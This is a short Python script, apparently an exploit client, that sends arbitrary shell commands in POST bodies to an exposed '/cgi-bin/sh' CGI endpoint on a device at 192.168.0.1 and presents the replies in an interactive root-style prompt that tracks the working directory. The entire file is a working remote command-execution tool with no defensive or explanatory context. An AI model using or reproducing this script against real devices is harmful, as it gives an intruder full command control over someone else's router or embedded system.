import os
import sys
import requests

def exploit(command, current_dir):
    url = 'http://192.168.0.1/cgi-bin/sh'
    headers = {
        'Content-Type': 'text/plain',
        'User-Agent': 'Mozilla/5.0'
    }
    if not command.endswith(';'):
        command+=";"
    data = f"X=X;echo 'Content-type: text/plain';echo;cd {current_dir};{command}"
    res = requests.post(url, headers=headers, data=data)
    return res.text

if __name__ == "__main__":
    current_dir = "/"
    while True:
        command = input(f"[ root@192.168.0.1:{current_dir} ]\n $ ")
        if command.startswith("cd "):
            path = command.split(" ", 1)[1]
            current_dir = os.path.normpath(os.path.join(current_dir, path))
            continue
        elif command == "clear" or command == "cls":
            os.system("clear")
        elif command == "exit":
            sys.exit()
        else:
            try:
                result = exploit(command, current_dir)
                if command.strip().startswith("pwd"):
                    current_dir = result.strip()
                print('\n' + result)
            except:
                pass
